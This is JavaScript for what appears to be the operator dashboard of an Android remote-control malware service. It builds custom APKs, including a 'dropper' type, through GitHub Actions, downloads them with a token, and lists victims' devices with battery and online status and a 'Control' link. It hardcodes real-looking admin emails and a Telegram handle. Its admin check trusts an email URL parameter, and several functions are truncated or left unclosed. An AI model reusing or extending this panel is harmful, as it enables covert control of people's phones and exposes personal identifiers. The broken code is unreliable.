    <script>
    // Define Admin emails list
    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];

    // Store current logged-in user profile in JS

    let healthListeners = {};

    // Update UI header UID initial placeholder

    // Load GitHub token from Firebase

    // Google Sign-In Handler
    function handleGoogleSignIn() {

            if (errEl) {

    }

    // Sign Out Handler
    function handleSignOut() {
        fbAuth.signOut().then(() => {
            window.location.href = 'login.html';
        }).catch(err => {
            console.error('Sign-out Error:', err);
        });
    }

    // Firebase Auth State Listener
    fbAuth.onAuthStateChanged(user => {
        if (user) {
            // Hide auth loader immediately
            const loader = document.getElementById('authLoader');
            if (loader) loader.style.display = 'none';
            document.getElementById('navUserProfile').style.display = 'flex';

            // Calculate user's UID (sanitize user's email or fallback to user.uid)
            const email = user.email || '';
            userId = email ? email.replace(/[@.]/g, '_') : user.uid;
            
            // Check if user is Admin
            const isAdmin = ADMIN_EMAILS.includes(email.toLowerCase());

            // Track user activity in Firebase users_meta
            trackUserActivity(user, 'Accessed Command Center');

            // Listen to real-time user permissions and role
            fbDb.ref('users_meta/' + userId).on('value', snap => {
                const umeta = snap.val() || {};
                window.userPermissions = umeta.permissions || {};
                window.isUserAdmin = isAdmin || umeta.role === 'ADMIN';

                // Display user name, avatar, role badge, and UID display
                document.getElementById('uidDisplay').textContent = userId;
                document.getElementById('userName').textContent = user.displayName || (email ? email.split('@')[0] : 'User');
                document.getElementById('userAvatar').src = user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';

                const roleBadge = document.getElementById('userRoleBadge');
                roleBadge.textContent = window.isUserAdmin ? 'ADMIN' : 'USER';
                if (window.isUserAdmin) {
                    roleBadge.style.background = 'rgba(235, 77, 75, 0.2)';
                    roleBadge.style.color = '#eb4d4b';
                    roleBadge.style.border = '1px solid rgba(235, 77, 75, 0.4)';
                } else {
                    roleBadge.style.background = 'rgba(0, 184, 148, 0.2)';
                    roleBadge.style.color = '#00b894';
                    roleBadge.style.border = '1px solid rgba(0, 184, 148, 0.4)';
                }

                // Show Admin Panel button if Admin
                const adminBtn = document.getElementById('adminPanelBtn');
                if (adminBtn) {
                    adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
                }

                // Setup device listeners after role is confirmed
                setupRealtimeHealthListeners();
            });

            // Initialize user session data & listeners
            initUserSession();
        } else {
            // User is signed out -> redirect immediately to dedicated login page (no bypass)
            currentUserProfile = null;
            window.location.replace('login.html');
        }
    });

    // Safety loader dismissal fallback
    setTimeout(() => {
        const loader = document.getElementById('authLoader');
        if (loader && loader.style.display !== 'none') {
            if (fbAuth.currentUser) {
                loader.style.display = 'none';
            } else {
                window.location.replace('login.html');
            }

    function trackUserActivity(user, actionName) {
        if (!user) return;
        const email = user.email || '';
        const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
        const isHardcodedAdmin = ADMIN_EMAILS.includes(email.toLowerCase());

        fbDb.ref('users_meta/' + uid).once('value', snap => {
            const umeta = snap.val() || {};
            const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
            const role = isHardcodedAdmin ? 'ADMIN' : (umeta.role || 'USER');

            const updatedData = {
                uid: uid,
                email: email,
                displayName: user.displayName || (email ? email.split('@')[0] : 'User'),
                photoURL: user.photoURL || '',
                role: role,
                last_login: Date.now(),
                last_login_formatted: new Date().toLocaleString(),
                login_count: loginCount,
                user_agent: navigator.userAgent
            };

            if (!umeta.created_at) updatedData.created_at = Date.now();
            fbDb.ref('users_meta/' + uid).update(updatedData);

            fbDb.ref(`users_meta/${uid}/activity_history`).push({
                time: Date.now(),
                action: actionName
            });

            fbDb.ref('audit_logs').push({
                timestamp: Date.now(),
                user: email || uid,
                action: actionName
            });
        });
    }

    function initUserSession() {
        // Initial check for existing build status & last_apk from Firebase for logged-in user
        fbDb.ref('panel_users/' + userId).once('value', snap => {
            const udata = snap.val();
            if (udata && udata.last_apk) {
                document.getElementById('downloadBtn').setAttribute('data-apk', udata.last_apk);
                if (udata.last_artifact_name) {
                    document.getElementById('downloadBtn').setAttribute('data-artifact', udata.last_artifact_name);
                }
                document.getElementById('downloadArea').style.display = 'block';
            }
        });

        // Start listening to realtime health and build status
        setupRealtimeHealthListeners();
        listenToBuildStatus();
    }

    // Ultra-Fast Direct APK download (Release Asset -> Artifact Zip Fallback)
    async function downloadApk(el) {
        const apkName = el.getAttribute('data-apk') || 'app.apk';
        const targetArtifact = el.getAttribute('data-artifact') || '';
        if (!githubToken) { alert('Token not loaded yet, wait a moment'); return; }
        el.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:6px;"></i>DOWNLOADING...';
        el.style.pointerEvents = 'none';
        
        try {
            // STAGE 1: Try Instant Direct Release Download (No unzipping, 1-2 sec max)
            let downloaded = false;
            try {
                const relRes = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/releases/tags/v1.0', {
                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
                });
                if (relRes.ok) {
                    const relData = await relRes.json();
                    const asset = (relData.assets || []).find(a => a.name === apkName || (userId && a.name.includes(userId)));
                    if (asset && asset.url) {
                        const apkRes = await fetch(asset.url, {
                            headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/octet-stream' }
                        });
                        if (apkRes.ok) {
                            const blob = await apkRes.blob();
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url; a.download = apkName; document.body.appendChild(a);
                            a.click(); a.remove();
                            setTimeout(() => URL.revokeObjectURL(url), 5000);
                            downloaded = true;
                        }
                    }
                }
            } catch(relErr) {
                console.warn('Release direct download skipped, falling back to artifact zip:', relErr);
            }

            // STAGE 2: Artifact Zip Fallback if Release asset wasn't ready
            if (!downloaded) {
                const res = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/artifacts?per_page=15', {
                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
                });
                const data = await res.json();
                const artifact = (data.artifacts || []).find(a => {
                    if (a.expired) return false;
                    if (targetArtifact) return a.name === targetArtifact;
                    return a.name.includes(userId);
                });
                if (!artifact) throw new Error('No APK build found for your account. Please build your APK first.');

                const zipRes = await fetch(artifact.archive_download_url, {
                    headers: { 'Authorization': 'token ' + githubToken }
                });
                if (!zipRes.ok) throw new Error('Failed to download artifact: ' + zipRes.status);
                const zipBlob = await zipRes.blob();

                const zip = await JSZip.loadAsync(zipBlob);
                const apkFile = Object.keys(zip.files).find(f => f.endsWith('.apk'));
                if (!apkFile) throw new Error('No APK found inside artifact zip');

                const apkBlob = await zip.files[apkFile].async('blob');
                const url = URL.createObjectURL(apkBlob);
                const a = document.createElement('a');
                a.href = url; a.download = apkName; document.body.appendChild(a);
                a.click(); a.remove();
                setTimeout(() => URL.revokeObjectURL(url), 5000);
            }

            el.innerHTML = '<i class="fas fa-check-circle" style="margin-right:6px;"></i>DOWNLOADED!';
            setTimeout(() => {
                el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
                el.style.pointerEvents = 'auto';
            }, 2000);
        } catch(err) {
            console.error('Download error:', err);
            alert('Download failed: ' + err.message);
            el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
            el.style.pointerEvents = 'auto';
        }
    }

    function toggleWebviewField() {
        const buildType = document.getElementById('buildTypeSelect').value;
        const container = document.getElementById('webviewContainer');
        const input = document.getElementById('webviewInput');
        
        if (buildType === 'dropper') {
            container.style.display = 'none';
            input.removeAttribute('required');
        } else {
            container.style.display = 'block';
            input.setAttribute('required', 'true');
        }
    }

    document.getElementById('buildForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const btn = document.getElementById('buildBtn');
        const text = document.getElementById('buildText');
        const icon = document.getElementById('buildIcon');

        // Check build permission
        const perms = window.userPermissions || {};
        if (!window.isUserAdmin && perms.build_apk === false) {
            alert('Access Denied: APK Building feature is disabled for your account. Contact Admin on Telegram (@abid64x) for access.');
            return;
        }
        
        btn.disabled = true;
        text.textContent = 'STARTING...';
        icon.className = 'fas fa-spinner fa-spin';

        const formData = new FormData(this);
        const appName = formData.get('app_name');
        const packageName = formData.get('package_name');
        const webviewUrl = formData.get('webview_url') || '';
        const buildType = formData.get('build_type');
        const iconFile = document.getElementById('appIconInput').files[0];

        // Track build activity & increment count
        if (fbAuth.currentUser) {
            fbDb.ref('users_meta/' + userId).once('value', snap => {
                const udata = snap.val() || {};
                const count = (udata.build_count || 0) + 1;
                fbDb.ref('users_meta/' + userId + '/build_count').set(count);
            });
            trackUserActivity(fbAuth.currentUser, `Triggered APK Build: ${appName} (${packageName})`);
        }

        let iconBase64 = '';
        if (iconFile) {
            try {
                iconBase64 = await new Promise((resolve, reject) => {
                    const img = new Image();
                    const url = URL.createObjectURL(iconFile);
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 96;
                        canvas.height = 96;
                        const ctx = canvas.getContext('2d');
                        // Fill white background for JPEG transparency compatibility
                        ctx.fillStyle = '#FFFFFF';
                        ctx.fillRect(0, 0, 96, 96);
                        ctx.drawImage(img, 0, 0, 96, 96);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                        URL.revokeObjectURL(url);
                        const b64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
                        console.log('Compressed Icon Base64 length:', b64.length);
                        resolve(b64);
                    };
                    img.onerror = (err) => {
                        URL.revokeObjectURL(url);
                        reject(err);
                    };
                    img.src = url;
                });
            } catch(err) {
                console.error('Error processing icon file:', err);
            }
        }

        // Reset progress UI & Firebase status
        document.getElementById('logLines').innerHTML = '';
        document.getElementById('progressBar').style.width = '5%';
        document.getElementById('buildStatus').textContent = 'Wait for building...';
        document.getElementById('progressArea').style.display = 'block';

        fbDb.ref('panel_users/' + userId + '/build_status').set({
            status: '⏳ Starting build...',
            percent: 10,
            last_log: 'Wait for building...'
        });

        // Trigger GitHub Actions workflow dispatch
        fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/workflows/build.yml/dispatches', {
            method: 'POST',
            headers: {
                'Authorization': 'token ' + githubToken,
                'Accept': 'application/vnd.github.v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ref: 'main',
                inputs: {
                    app_name: appName,
                    package_name: packageName,
                    webview_url: webviewUrl,
                    user_id: userId,
                    build_type: buildType,
                    app_icon_b64: iconBase64
                }
            })
        }).then(res => {
            if (res.ok || res.status === 204) {
                console.log('GitHub Actions workflow triggered successfully');
                listenToBuildStatus();
            } else {
                return res.json().then(errData => {
                    throw new Error(errData.message || 'Failed to trigger workflow');
                });
            }
        }).catch(err => {
            console.error('Build trigger error:', err);
            document.getElementById('buildStatus').textContent = '❌ Trigger error: ' + err.message;
            btn.disabled = false;
            text.textContent = 'BUILD APK';
            icon.className = 'fas fa-rocket';
        });
    });

    function listenToBuildStatus() {
        fbDb.ref('panel_users/' + userId + '/build_status').on('value', snap => {
            const v = snap.val();
            if (!v) return;
            
            document.getElementById('progressBar').style.width = (v.percent || 0) + '%';
            document.getElementById('buildStatus').textContent = v.status || '';
            
            if (v.last_log && v.last_log !== window._ll) {
                window._ll = v.last_log;
                const l = document.createElement('div');
                l.className = 'console-line';
                l.textContent = '> ' + v.last_log;
                document.getElementById('logLines').appendChild(l);
                document.getElementById('consoleLog').scrollTop = 999999;
            }
            
            const btn = document.getElementById('buildBtn');
            const text = document.getElementById('buildText');
            const icon = document.getElementById('buildIcon');

            if (v.status === '✅ Complete') {
                text.textContent = 'SUCCESS!';
                icon.className = 'fas fa-check-circle';
                fbDb.ref('panel_users/' + userId).once('value', u => {
                    const ud = u.val();
                    if (ud && ud.last_apk) {
                        document.getElementById('downloadBtn').setAttribute('data-apk', ud.last_apk);
                        if (ud.last_artifact_name) {
                            document.getElementById('downloadBtn').setAttribute('data-artifact', ud.last_artifact_name);
                        }
                        document.getElementById('downloadArea').style.display = 'block';
                    }
                });
                setTimeout(() => {
                    btn.disabled = false;
                    text.textContent = 'BUILD APK';
                    icon.className = 'fas fa-rocket';
                    document.getElementById('progressArea').style.display = 'none';
                }, 5000);
            } else if (v.status && (v.status.includes('❌') || v.status.includes('⚠️'))) {
                text.textContent = 'FAILED';
                icon.className = 'fas fa-exclamation-triangle';
                setTimeout(() => {
                    btn.disabled = false;
                    text.textContent = 'BUILD APK';
                    icon.className = 'fas fa-rocket';
                }, 3000);
            }
        });
    }

    function checkIsAdmin() {
        if (window.isUserAdmin === true) return true;
        const adminEmailsLower = ADMIN_EMAILS.map(e => e.toLowerCase());
        if (fbAuth.currentUser && fbAuth.currentUser.email) {
            if (adminEmailsLower.includes(fbAuth.currentUser.email.toLowerCase())) return true;
        }
        if (currentUserProfile && currentUserProfile.email) {
            if (adminEmailsLower.includes(currentUserProfile.email.toLowerCase())) return true;
        }
        if (currentUserProfile && currentUserProfile.role === 'ADMIN') return true;
        if (userId && adminEmailsLower.includes(userId.toLowerCase())) return true;
        const emailParam = (urlParams.get('email') || urlParams.get('user_email') || '').toLowerCase();
        if (emailParam && adminEmailsLower.includes(emailParam)) return true;
        return false;
    }

    function renderDeviceList() {
        const body = document.getElementById('deviceList');
        const skeleton = document.getElementById('deviceSkeleton');
        const listArea = document.getElementById('deviceListArea');
        
        skeleton.style.display = 'none';
        listArea.style.display = 'block';
        
        let devices = Object.values(deviceCache);
        const isAdmin = checkIsAdmin();
        
        // Dynamically adjust table header based on Admin vs Normal user mode
        const tableHead = document.querySelector('.data-table thead tr');
        if (tableHead) {
            if (isAdmin) {
                tableHead.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
            } else {
                tableHead.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
            }
        }
        
        if (!devices.length) {
            document.getElementById('deviceCount').textContent = 0;
            document.getElementById('onlineCount').textContent = '0 online';
            const colspan = isAdmin ? 5 : 4;
            body.innerHTML = `<tr><td colspan="${colspan}"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>`;
            return;
        }
        
        // Sort: online first, then by lastSeen
        devices.sort((a, b) => {
            if (a.is_online !== b.is_online) return b.is_online - a.is_online;
            return (b.lastSeen || 0) - (a.lastSeen || 0);
        });
        
        const onlineNum = devices.filter(d => d.is_online).length;
        
        document.getElementById('deviceCount').textContent = devices.length;
        const onlineEl = document.getElementById('onlineCount');
        onlineEl.textContent = onlineNum + ' online';
        onlineEl.style.background = onlineNum > 0 ? 'rgba(0,184,148,0.2)' : 'rgba(255,107,107,0.15)';
        onlineEl.style.color = onlineNum > 0 ? '#00b894' : '#ff6b6b';
        
        let h = '';
        devices.forEach(d => {
            const st = d.is_online ? 'status-online' : 'status-offline';
            const sl = d.is_online ? 'Online' : 'Offline';
            const rowClass = d.is_online ? 'device-row-online' : 'device-row-offline';
            const bi = d.battery < 20 ? 'fa-battery-empty text-danger-c' : d.battery < 50 ? 'fa-battery-quarter text-warning-c' : 'fa-battery-full text-success-c';
            const ownerUid = d.ownerUid || userId;
            const ownerEmail = d.ownerEmail || ownerUid;
            
            const controlUrl = `control.html?uid=${encodeURIComponent(ownerUid)}&did=${encodeURIComponent(d.did)}`;
            
            let ownerCell = '';
            if (isAdmin) {
                const ownerDisplay = (ownerEmail && ownerEmail !== ownerUid)
                    ? `${ownerEmail}`
                    : ownerUid;
                ownerCell = `<td><span class="user-badge owner-pill" style="background:rgba(108,92,231,0.15);color:#a29bfe;border:1px solid rgba(108,92,231,0.3);padding:3px 8px;border-radius:6px;font-size:0.72rem;font-weight:600;display:inline-flex;align-items:center;gap:5px;" title="${ownerEmail} (${ownerUid})"><i class="fas fa-user-shield" style="font-size:0.65rem;"></i>${ownerDisplay}</span></td>`;
            }

            let deleteBtnHtml = '';
            if (isAdmin) {
                deleteBtnHtml = `<button onclick="deleteDevice('${ownerUid}', '${d.did}', '${d.model.replace(/'/g, "\\'")}')" style="background:rgba(255,71,87,0.15);color:#ff4757;border:1px solid rgba(255,71,87,0.35);padding:7px 10px;border-radius:6px;font-size:0.75rem;cursor:pointer;font-weight:700;transition:all 0.2s ease;" title="Delete Device from Firebase"><i class="fas fa-trash-alt"></i></button>`;
            }

            h += `<tr class="${rowClass}">
                <td>
                    <div style="font-weight:600;font-size:0.85rem;">${d.model}</div>
                    <div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div>
                </td>
                ${ownerCell}
                <td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td>
                <td><span class="${st}">${sl}</span></td>
                <td style="text-align:right;">
                    <div style="display:inline-flex;align-items:center;gap:6px;">
                        <a href="${controlUrl}" class="btn-accent" style="text-decoration:none;padding:7px 14px;font-size:0.75rem;">
                            <i class="fas fa-terminal" style="margin-right:4px;"></i>Control
                        </a>
                        ${deleteBtnHtml}
                    </div>
                </td>
            </tr>`;
        });
        body.innerHTML = h;
    }

    function deleteDevice(ownerUid, did, model) {
        if (!window.isUserAdmin && !checkIsAdmin()) {
            alert('Only admins can delete devices.');
            return;
        }

        if (!confirm(`Are you sure you want to delete device "${model}" (${did}) from Firebase?`)) {
            return;
        }

        fbDb.ref('users/' + ownerUid + '/devices/' + did).remove().then(() => {
            const cacheKey = ownerUid + '_' + did;
            delete deviceCache[cacheKey];
            delete healthListeners[cacheKey];
            renderDeviceList();
            if (fbAuth.currentUser) {
                trackUserActivity(fbAuth.currentUser, `Deleted Device: ${model} (${did})`);
            }
        }).catch(err => {
            alert('Failed to delete device: ' + err.message);
        });
    }

    // Realtime health listeners for serverless setup with Admin vs Normal User Isolation
    function setupRealtimeHealthListeners() {
        // Clear previous listeners and cache
        fbDb.ref('users').off();
        if (userId) {
            fbDb.ref('users/' + userId + '/devices').off();
        }
        deviceCache = {};
        healthListeners = {};

        const isAdmin = checkIsAdmin();

        const listenToUserDevices = (targetUid, ownerEmail = '') => {
            const devicesRef = fbDb.ref('users/' + targetUid + '/devices');
            
            devicesRef.once('value', snap => {
                if (!snap.exists() || !snap.hasChildren()) {
                    renderDeviceList();
                }
            });

            devicesRef.on('child_added', snap => {
                const did = snap.key;
                const cacheKey = targetUid + '_' + did;
                if (healthListeners[cacheKey]) return;
                
                healthListeners[cacheKey] = true;
                
                const healthRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/health');
                const infoRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/info');
                
                healthRef.on('value', hSnap => {
                    const health = hSnap.val() || {};
                    const now = Date.now();
                    
                    let is_online = health.online === true || health.online === 'true' || health.online === 1;
                    if (is_online && health.lastSeen) {
                        if ((now - health.lastSeen) > 90000) is_online = false;
                    }
                    
                    if (!deviceCache[cacheKey]) {
                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
                    }
                    deviceCache[cacheKey].battery = health.battery || 0;
                    deviceCache[cacheKey].is_online = is_online;
                    deviceCache[cacheKey].lastSeen = health.lastSeen || 0;
                    renderDeviceList();
                });
                
                infoRef.on('value', iSnap => {
                    const info = iSnap.val() || {};
                    if (!deviceCache[cacheKey]) {
                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
                    }
                    deviceCache[cacheKey].model = info.model || info.brand || 'Unknown';
                    if (info.email) deviceCache[cacheKey].ownerEmail = info.email;
                    renderDeviceList();
                });
            });
            
            devicesRef.on('child_removed', snap => {
                const did = snap.key;
                const cacheKey = targetUid + '_' + did;
                delete deviceCache[cacheKey];
                delete healthListeners[cacheKey];
                fbDb.ref('users/' + targetUid + '/devices/' + did + '/health').off();
                fbDb.ref('users/' + targetUid + '/devices/' + did + '/info').off();
                renderDeviceList();
            });
        };

        if (isAdmin) {
            // ADMIN: Listen to ALL users' devices across the root 'users' node
            const usersRef = fbDb.ref('users');
            
            usersRef.once('value', snap => {
                if (!snap.exists() || !snap.hasChildren()) {
                    renderDeviceList();
                }
            });

            usersRef.on('child_added', uSnap => {
                const targetUid = uSnap.key;
                const uData = uSnap.val() || {};
                const uEmail = uData.email || uData.user_email || targetUid;
                listenToUserDevices(targetUid, uEmail);
            });

            usersRef.on('child_removed', uSnap => {
                const targetUid = uSnap.key;
                Object.keys(deviceCache).forEach(cacheKey => {
                    if (deviceCache[cacheKey].ownerUid === targetUid) {
                        delete deviceCache[cacheKey];
                        delete healthListeners[cacheKey];
                    }
                });
                fbDb.ref('users/' + targetUid + '/devices').off();
                renderDeviceList();
            });
        } else {
            // NORMAL USER: ONLY listen to personal devices
            listenToUserDevices(userId, currentUserProfile ? currentUserProfile.email : userId);
        }
    }

    function refreshDevices() {
        document.getElementById('deviceSkeleton').style.display = 'block';
        document.getElementById('deviceListArea').style.display = 'none';
        setupRealtimeHealthListeners();
    }
    </script>
